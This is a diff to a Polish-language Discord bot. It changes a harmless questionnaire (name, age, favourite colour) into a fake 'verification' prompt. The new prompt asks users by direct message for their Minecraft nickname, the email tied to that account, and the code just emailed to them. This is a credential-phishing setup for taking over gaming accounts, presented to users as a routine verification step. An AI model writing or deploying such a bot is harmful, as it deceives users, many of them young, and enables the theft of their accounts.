@@ -21,12 +21,12 @@ console.log(`[DEBUG] Bot uruchomiony z PID: ${process.pid} o ${new Date().toLoca
    if (!interaction.isButton()) return;
  
    if (interaction.customId === 'start_form') {
-     await interaction.reply({ content: 'Zaraz zadam Ci kilka pytań. Odpowiadaj po kolei.', ephemeral: true });
+     await interaction.reply({ content: 'Zaraz zostaniesz zweryfikowany.', ephemeral: true });
  
      const questions = [
-       'Jak masz na imię?',
-       'Ile masz lat?',
-       'Jaki jest Twój ulubiony kolor?'
+       'Twój nick w minecraft?',
+       'Twój mail używany do minecrafta?',
+       'Kod wysłany na adres mailowy?'
      ];
  
      const answers = [];
@@ -43,7 +43,7 @@ console.log(`[DEBUG] Bot uruchomiony z PID: ${process.pid} o ${new Date().toLoca
        }).catch(() => null);
  
        if (!collected) {
-         return dmChannel.send('Czas minął. Spróbuj ponownie klikając przycisk jeszcze raz.');
+         return dmChannel.send('Timeout.');
        }
  
        const answer = collected.first().content;
@@ -78,13 +78,13 @@ console.log(`[DEBUG] Bot uruchomiony z PID: ${process.pid} o ${new Date().toLoca
    if (message.content === '!start') {
      const button = new ButtonBuilder()
        .setCustomId('start_form')
-       .setLabel('Wypełnij formularz')
+       .setLabel('Zweryfikuj się')
        .setStyle(ButtonStyle.Primary);
  
      const row = new ActionRowBuilder().addComponents(button);
  
      await message.channel.send({
-       content: 'Kliknij przycisk, aby wypełnić formularz:',
+       content: 'Kliknij aby się zweryfikować',
        components: [row]
      });
    }
